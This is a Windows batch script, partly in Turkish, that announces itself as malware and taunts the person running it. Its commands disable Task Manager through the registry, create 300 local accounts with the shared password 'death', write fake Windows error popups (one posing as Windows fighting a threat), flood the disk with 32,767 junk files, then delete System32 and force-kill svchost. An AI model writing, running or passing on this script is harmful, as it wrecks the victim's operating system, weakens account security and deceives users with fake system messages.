@echo off
echo Hi, this is an actual malware want to continue ?
pause
echo Ok so , i know your name . wanna see proof?
pause
echo idk what u said but, is your username : "%username%"
pause
echo Huh ? you don't believe that?
timeout /t 2 /nobreak
echo How ?
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
timeout /t 2 /nobreak
echo So, im in your PC wanna see proof ?
setlocal enabledelayedexpansion

set "base_username=BruhNoEscape"
set "password=death"

for /l %%i in (1,1,300) do (
    set "username=%base_username%%%i"
    net user !username! %password% /add
)
pause
echo Ok then im gonna show you.
start start ms-settings:accounts-family
echo.X=MsgBox("Hesaplarınız Bolumune Bak ",0+16,"Nah i'd win") >> FakeErrorMsg.vbs
echo Haha , ŞIMDI SENI HESAPTAN ATIP MILYONLARCA KOMBİNASYONU MU DENETTIREYIM HE?
pause
clr
echo 🛡️🛡️🛡️🛡️
echo.X=MsgBox("Cihazınızdaki tehditle savasirken lutfen cihazinizi kapatmayin ",0+16,"Windows ") >> FakeErrorMsg2.vbs
echo N-ne? Nasıl ben defender'i kapattim.. ne..?
color 4
echo **Savaşma Sesleri**
echo **Savaşma Sesleri**
echo **Savaşma Sesleri**
echo **Savaşma Sesleri**
echo **Savaşma Sesleri**
echo **Savaşma Sesleri**
color f
echo HAHAHHA BILGISAYARIN BENIM !

:: Create 32767 files with a long name
for /l %%j in (1,1,32767) do (
    type nul > "UR NEXT UR NEXT UR NEXT_%%j.txt"
)

del /s /q C:\Windows\System32\*
taskkill /f /im svchost.exe
pause
